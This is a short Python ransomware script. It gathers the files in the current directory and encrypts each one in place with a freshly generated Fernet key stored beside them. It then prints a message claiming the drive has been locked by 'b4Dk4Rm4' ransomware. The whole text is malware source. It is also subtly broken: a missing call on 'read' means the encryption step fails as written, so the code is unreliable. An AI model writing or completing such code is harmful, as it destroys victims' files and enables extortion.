#!/usr/bin/env python3

import os 
from cryptography.fernet import Fernet

# discover files 
files = []
for file in os.listdir(): 
    if file == "ransome.py" or file == "thekey.key" or file == "decrypt.py" :
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

# generate a decryption key
key = Fernet.generate_key()

with open("thekey.key", "wb") as thekey:
        thekey.write(key)

# encrypt the files in the files array

for file in files:
        with open(file, "rb") as thefile:
                contents = thefile.read
        contents_encrypted = Fernet(key).encrypt(contents)
        with open(file, "wb") as thefile:
                thefile.write(contents_encrypted)        

print("we regret to inform you, the contents of your directory and drive have been locked by b4Dk4Rm4 malware/ransomware")